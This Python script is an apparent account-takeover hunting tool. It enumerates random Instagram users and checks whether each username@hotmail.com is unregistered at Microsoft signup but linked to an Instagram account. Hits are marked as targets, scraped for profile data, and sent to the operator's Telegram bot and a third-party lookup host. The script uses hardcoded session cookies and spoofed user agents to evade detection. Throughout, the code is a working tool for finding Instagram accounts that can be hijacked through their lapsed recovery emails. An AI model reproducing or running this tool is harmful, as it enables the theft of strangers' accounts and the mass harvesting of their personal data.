import requests
import random 
import os
from user_agent import generate_user_agent
import time
from hashlib import md5
from threading import Thread
from hashlib import md5
H = md5(str(time.time()).encode()).hexdigest()
app=''.join(random.choice('1234567890')for i in range(16))
#print(H)
q=0
w=0
e=0
M=0
ids=[]
token=input('Enter Token : ')
ID=input('Enter ID : ')
os.system('clear')

gre = '\033[2;32m'
red = '\033[1;31m'
red = '\033[1;31m'
yel = '\033[1;33m'
gre = '\033[2;32m'
wh = "\033[1;97m"
ble = '\033[2;36m'
blu = '\033[1;34m' 
F = '\033[1;32m'
Z = '\033[1;31m'
def ali(user):
	cc = user
	global q,w,e,M
	cookies = {
	    'mkt': 'ar-XA',
	    'MicrosoftApplicationsTelemetryDeviceId': 'b8e93f81-51f6-4af4-a498-689fefcf697b',
	    'MUID': 'c6b087823f134e1493964328c7f5f6f6',
	    '_pxvid': 'dfd131fe-6555-11ef-91a5-7e5bf9c5b607',
	    'MSFPC': 'GUID=7ac3f3a7af3646c8ab1d8b530c2de4a3&HASH=7ac3&LV=202408&V=4&LU=1724860499803',
	    'PPLState': '1',
	    'MSPAuth': 'Disabled',
	    'MSPProf': 'Disabled',
	    'NAP': 'V=1.9&E=1dd5&C=b38nDbCIrXFiv1ttn3NRdyQlLvxKzkpUMcuX1NxsrHi4FO-xUtmCMw&W=2',
	    'ANON': 'A=DCCF1D43DA061B07E595D1C5FFFFFFFF&E=1e2f&W=2',
	    'WLSSC': 'EgAdAgMAAAAMgAAAngABXuzCGL4f0PpsOtz7Qf5Kf0LYy0w01DhiUF3aogqw2V3XFScNcXMnUF5NMnt9oh0IvleLeu7Npt+Q2bzVW1/g1l5vopQoKYdi9LftrLea38zKZIQsa7R6bJRPY++kpN0qZt6Bd35J+TXVz7cs0ihqpe7M7s31JReWMFkPV4crg/5cAyDUBQyPf6daJPQ0fmDMCbmhS634jxsvoAWgTjZKuNtqXt2VF1y4h+uorLf239dUf74hSGIX1gmpuj1yuNx6lDsxb1kFTKXhj1PemxxA279pjO1Nq0hZP21psYys6slSTB+85WAEGqbqIqouLPi8lgtYAMWjKEUA4E2sRz3+FQwBfgAMAf9/AwCfnuaEQaHRZiOh0WYQJwAAChGggBARAHF6dGlAb3V0bG9vay5jb20AVgAAHXF6dGklb3V0bG9vay5jb21AcGFzc3BvcnQuY29tAAAAAklRAAAAAAAASAECAACPK1VAAAZDAAZvdGhtYW4ABW9zYW1hAAAAAAAAAAAAAAAAAAAAAAAAW3tSwX2XVVsAAEGh0WYjSEhnAAAAAAAAAAAAAAAADQAzNy43Ny43My4xNjYABAEAAAAAAAAAAAAAAAABBAAAAAAAAAAAAAAAAAAAAKyUcWOctFTIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAA==',
	    'mkt1': 'ar-XA',
	    'amsc': '8dZIHOpAlPAJjI9Sz49WXEysDodFC9w2gXiyulopLKBJJbGtbHFwS1IWWN11YOB8HqckLLKxLtZQGMXnBMwTS+9iTusJnftppF0UuCNRhMrGxc09j11H7jhk2r8q3PKD3DzsCj8+S9DUTih9adI5XY/jVdygWtnBMVkvGVp/8FRmFKRYujHhdSiL9LMuycOoSpo5lOyKjpHZLj932iqOqeuy0sVrecp1sl5tB/BCfPfOn2iT93Jqtf44L/TJw5LZEb6MaTzB0V9oxGgqlyZqwYOCZqdqB2E00SRBk4i+Y9s=:2:3c',
	    'ai_session': 'rs/jFQDlySGMc7KH4WtXye|1725463356556|1725463356556',
	    'fptctx2': 'taBcrIH61PuCVH7eNCyH0HyAAKgSb15ZEqidLg30r8Mm7EmT2%252bUGMAj9DhNrdtVzrmRdg2%252fS3WUn303IvaY7YF%252bbeAK5GD8yVlo7tq7nA4MvJOFdmsT1aMWAojS8GJsSg9%252bT0sJku0r0ZFel562NidrVavkfciR%252bBQp3aZlc%252b06s37WT8Ku0t5ze0jU9sYEVVfJJHOna6V%252f8Sh5%252fR%252bJhY%252f2MlzeVKHAHfEg1B0XgJGwd1Wf%252bJpBTKNi07AirZqTFWYV1O%252b3V00T%252bxR8z24RoyP3oNZ%252fMUAKfP5VwZZzESbtHwLnmEw%252fXyzJhDMykmIRDXz%252fgv1UAn7S5z%252bMEbycIkQ%253d%253d',
	    '_px3': '05cf14203cc7c5bb3529151e60caa0df2d8e1dbef6d4c8b86d87ac0643c36150:I6MgQmZz5V6W//5P0TzZAp1+9DwEwMpB1o5f855zgSKXHl6Mg5XIhQQPmP2pNoW4348BjErxGWHmmEz/Z7wL6g==:1000:BY4FQ6xJjEXQrA8xK2nZKX/thLf91YGLGP6DuMpd3obSQvphLGkMhPu1YUHSI+GkMy1pUSlTrFYIiaAdxxH0agnbsFeOzKqYHXgtFT+pzOcZhz00xPQt8FUheuSjjN+VpiMWcwfLUVs1mPmN6GHJpmPLl/cfPuHEsgOvJ72R3QNQU4oGuHWvuSVq19aQP9PNJaVwbad+Q2DTIoBv+McDronT4u/0L240oW1CXiRc82g=',
	    '_pxde': '4a59f90090fadbe4fa38a98daf92a07b5baa5a4c4850dc423b5c974fd775b846:eyJ0aW1lc3RhbXAiOjE3MjU0NjMzNjA5OTcsImZfa2IiOjAsImlwY19pZCI6W119',
	}
	
	headers = {
	    'authority': 'signup.live.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'canary': '6v5FllQ37Akg6CNOvfTuweVF3T9YQmRDPzJWZmpT1MIbFXBcZ0Pmrq+FEXJ8MSuQJpC6a6P/kzbjU1vh0TptcfINDfx19NWF25PmaDeJq1ekClDPX5midMOba6WeIpEau/FOSjSAFpJvVERtS06zz+0q48Kg91utxhfvOLl3cKPvyQzzvOOKbsRY+/V0LqiLVSQj5TRi18ArEUgSrBc5hgdLwnMcnJDvPEpLdmXGRp2U5Iya5TS/GsTYhtLeG9M7:2:3c',
	    'client-request-id': '6c8f97b2d8b64d98a0fa47e20b3a067b',
	    'content-type': 'application/json; charset=utf-8',
	    'correlationid': '6c8f97b2d8b64d98a0fa47e20b3a067b',
	    'hpgact': '0',
	    'hpgid': '200225',
	    'origin': 'https://signup.live.com',
	    'referer': 'https://signup.live.com/signup?mkt=ar-xa&lic=1',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': generate_user_agent(),
	}
	
	params = {
	    'mkt': 'ar-xa',
	    'lic': '1',
	}
	
	json_data = {
	    'includeSuggestions': True,
	    'signInName': f'{cc}@hotmail.com',
	    'uiflvr': 1001,
	    'scid': 100118,
	    'uaid': '6c8f97b2d8b64d98a0fa47e20b3a067b',
	    'hpgid': 200225,
	}
	
	re = requests.post(
	    'https://signup.live.com/API/CheckAvailableSigninNames',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	).text
	if '"isAvailable":true' in re:
		q+=1
		os.system('cls' if os.name == 'nt' else 'clear')
		print(f'''									
{red}[ {gre}𝗩𝟭𝟮 {red}]{gre}Done  ➪  {M}      		
{red}[ {gre}𝗩𝟭𝟮 {red}]{wh}Good Hotmail  ➪  {q}         		    
{red}[ {gre}𝗩𝟭𝟮 {red}]{yel}Bad Instagram  ➪  {w}          			    
{red}[ {gre}𝗩𝟭𝟮 {red}]{red}Bad Hotmail  ➪  {e}   
{red}[ {gre}𝗩𝟭𝟮 {red}]{ble}Email  ➪  {cc}@hotmail.com    

''')

		cookies = {
		    'ig_did': 'A7300F6A-992A-4FE1-A566-B1F9504ED44C',
		    'ig_nrcb': '1',
		    'mid': 'Zs-L8QABAAH1NylH3ZpGnt5ty8MK',
		    'datr': '8YvPZgfIhPj28BTHg4NrjVz3',
		    'ps_l': '1',
		    'ps_n': '1',
		    'shbid': '"8199\\05450585463533\\0541756685978:01f73769e5c1f1fed4d7292257deff058e03db67ae3007803fdedfdd68e4d9e794ef1002"',
		    'shbts': '"1725149978\\05450585463533\\0541756685978:01f7564a8882086315566ff544b536d46a489f07b7ed39de3d3d04b08279d46f1862f81e"',
		    'csrftoken': 'p9rkatqHvl6OPWQUyGsTE10ZSkh20TU8',
		    'dpr': '2.25',
		    'wd': '480x919',
		}
		
		headers = {
		    'authority': 'www.instagram.com',
		    'accept': '*/*',
		    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/x-www-form-urlencoded',
		    'origin': 'https://www.instagram.com',
		    'referer': 'https://www.instagram.com/accounts/signup/email/?hl=ar',
		    'sec-ch-prefers-color-scheme': 'dark',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-model': '"RMX3511"',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-ch-ua-platform-version': '"13.0.0"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': generate_user_agent(),
		    'x-asbd-id': '129477',
		    'x-csrftoken': 'p9rkatqHvl6OPWQUyGsTE10ZSkh20TU8',
		    'x-ig-app-id': '1217981644879628',
		    'x-ig-www-claim': '0',
		    'x-instagram-ajax': '1016201612',
		    'x-requested-with': 'XMLHttpRequest',
		}
		
		params = {
		    'hl': 'ar',
		}
		
		data = {
		    'email': f'{cc}@hotmail.com',
		}
		
		res = requests.post(
		    'https://www.instagram.com/api/v1/web/accounts/check_email/',
		    params=params,
		    cookies=cookies,
		    headers=headers,
		    data=data,
		)
		if "email_is_taken" in res.text:
			M+=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'''									
{red}[ {gre}𝗩𝟭𝟮 {red}]{gre}Done  ➪  {M}      		
{red}[ {gre}𝗩𝟭𝟮 {red}]{wh}Good Hotmail  ➪  {q}         		    
{red}[ {gre}𝗩𝟭𝟮 {red}]{yel}Bad Instagram  ➪  {w}          			    
{red}[ {gre}𝗩𝟭𝟮 {red}]{red}Bad Hotmail  ➪  {e}   
{red}[ {gre}𝗩𝟭𝟮 {red}]{ble}Email  ➪  {cc}@hotmail.com    

''')
			cookies = {
			    'csrftoken': '0uZYzvtUhu6-U4CARhIaM3',
			    'ig_did': '394458D6-565A-48F0-BFBB-CB75FD177F49',
			    'ig_nrcb': '1',
			    'dpr': '2.25',
			    'mid': 'ZsqbPgABAAFrLhyT_amwiK59BNv4',
			    'datr': 'PpvKZjhMQN858xPWY13-suQ2',
			    'wd': '480x919',
			}
			
			headers = {
			    'authority': 'www.instagram.com',
			    'accept': '*/*',
			    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
			    'referer': 'https://www.instagram.com/shbs/',
			    'sec-ch-prefers-color-scheme': 'dark',
			    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
			    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
			    'sec-ch-ua-mobile': '?1',
			    'sec-ch-ua-model': '"RMX3511"',
			    'sec-ch-ua-platform': '"Android"',
			    'sec-ch-ua-platform-version': '"13.0.0"',
			    'sec-fetch-dest': 'empty',
			    'sec-fetch-mode': 'cors',
			    'sec-fetch-site': 'same-origin',
			    'user-agent': str(generate_user_agent()),
			    'x-asbd-id': '129477',
			    'x-csrftoken': '0uZYzvtUhu6-U4CARhIaM3',
			    'x-ig-app-id': '1217981644879628',
			    'x-ig-www-claim': '0',
			    'x-requested-with': 'XMLHttpRequest',
			}
			
			params = {
			    'username': cc,
			}
			
			VV = response = requests.get(
			    'https://www.instagram.com/api/v1/users/web_profile_info/',
			    params=params,
			    cookies=cookies,
			    headers=headers,
			).json()		
			name = VV['data']['user']['full_name']
			bio = VV['data']['user']['biography']
			fols = VV['data']['user']['edge_followed_by']['count']
			flog = VV['data']['user']['edge_follow']['count']
			id = VV['data']['user']['id']
			pr = VV['data']['user']['is_private']
			op = response['data']['user']['edge_owner_to_timeline_media']['count']
			try:
				re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
				ree = re.json()
				data = ree['date']
			except:
				data="Not Data"
			ff = f'''
Dev | 𝗩𝟭𝟮
Ibn_Suleiman | @CM_V12
		
••••••••••••••••••••••••••••••••••••••••••••••
Name : {name}
User : {cc}
Email : {cc}@hotmail.com
Followers : {fols}
Following : {flog}
Data : {data} 
Post : {op} 
ID : {id}
Link : https://www.instagram.com/{cc}
••••••••••••••••••••••••••••••••••••••••••••••
							'''
			print(gre+ff)
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}''')
			i = requests.post(tlg)
		else:
			w+=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'''									
{red}[ {gre}𝗩𝟭𝟮 {red}]{gre}Done  ➪  {M}      		
{red}[ {gre}𝗩𝟭𝟮 {red}]{wh}Good Hotmail  ➪  {q}         		    
{red}[ {gre}𝗩𝟭𝟮 {red}]{yel}Bad Instagram  ➪  {w}          			    
{red}[ {gre}𝗩𝟭𝟮 {red}]{red}Bad Hotmail  ➪  {e}   
{red}[ {gre}𝗩𝟭𝟮 {red}]{ble}Email  ➪  {cc}@hotmail.com    

''')
	else:
		e+=1
		os.system('cls' if os.name == 'nt' else 'clear')
		print(f'''									
{red}[ {gre}𝗩𝟭𝟮 {red}]{gre}Done  ➪  {M}      		
{red}[ {gre}𝗩𝟭𝟮 {red}]{wh}Good Hotmail  ➪  {q}         		    
{red}[ {gre}𝗩𝟭𝟮 {red}]{yel}Bad Instagram  ➪  {w}          			    
{red}[ {gre}𝗩𝟭𝟮 {red}]{red}Bad Hotmail  ➪  {e}   
{red}[ {gre}𝗩𝟭𝟮 {red}]{ble}Email  ➪  {cc}@hotmail.com    

''')

def rand_ids():  
  Id= str(random.randrange(128053904,438909537))
  if Id not in ids:
    ids.append(Id)
    return Id
  else:
    rand_ids()    
def username1():
  global check
  try:
    while True:      
      rnd=str(random.randint(150, 999))
      user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
      Id = rand_ids()
      lsd=''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(32))
      headers = {
    'accept': '*/*',
    'accept-language': 'en,en-US;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'dnt': '1',
    'origin': 'https://www.instagram.com',
    'priority': 'u=1, i',
    'referer': 'https://www.instagram.com/cristiano/following/',
    'user-agent': user_agent,
    'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
    'x-fb-lsd': lsd,
}
      data = {
    'lsd': lsd,
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
    'variables': '{"userID":"'+str(Id)+'","username":"cristiano"}',
    'server_timestamps': 'true',
    'doc_id': '7717269488336001',
}
      response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
      user =response.json()['data']['user']['username'] 
      ali(user)  
  except :
  	username1()

for i in range(10):
  Thread(target=username1).start()